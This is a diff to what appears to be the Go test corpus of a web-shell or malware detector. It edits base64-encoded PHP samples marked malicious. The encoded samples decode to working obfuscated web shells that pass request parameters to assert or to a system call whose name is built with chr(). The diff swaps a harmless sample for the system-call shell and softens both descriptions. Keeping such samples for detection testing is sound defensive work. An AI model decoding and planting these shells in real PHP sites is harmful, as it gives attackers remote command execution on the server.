@@ -17,7 +17,7 @@ var samples = []Sample{
 		YaraGap:     true,
 		Ext:         ".php",
 		Malicious:   true,
-		Description: "the same primitive through assert, with the function name split to defeat literal matching",
+		Description: "a legacy PHP string assertion, with the function name split to defeat literal matching",
 		Encoded:     "PD9waHAgJGE9J2FzcycuJ2VydCc7ICRhKCRfUkVRVUVTVFsncSddKTsgPz4K",
 	},
 	{
@@ -35,8 +35,8 @@ var samples = []Sample{
 		YaraGap:     true,
 		Ext:         ".php",
 		Malicious:   true,
-		Description: "code assembled character by character with chr() so no keyword appears in the file",
-		Encoded:     "PD9waHAgJHM9Y2hyKDEwMSkuY2hyKDExOCkuY2hyKDk3KS5jaHIoMTA4KTsgJHMoY2hyKDEwMSkuY2hyKDEyMCkuY2hyKDEwNSkuY2hyKDExNikuY2hyKDU5KSk7ID8+Cg==",
+		Description: "a request command passed to a callable function whose name is assembled with chr()",
+		Encoded:     "PD9waHAgJHM9Y2hyKDExNSkuY2hyKDEyMSkuY2hyKDExNSkuY2hyKDExNikuY2hyKDEwMSkuY2hyKDEwOSk7ICRzKCRfR0VUWydjbWQnXSk7ID8+Cg==",
 	},
 	{
 		Name:        "uploader_form",
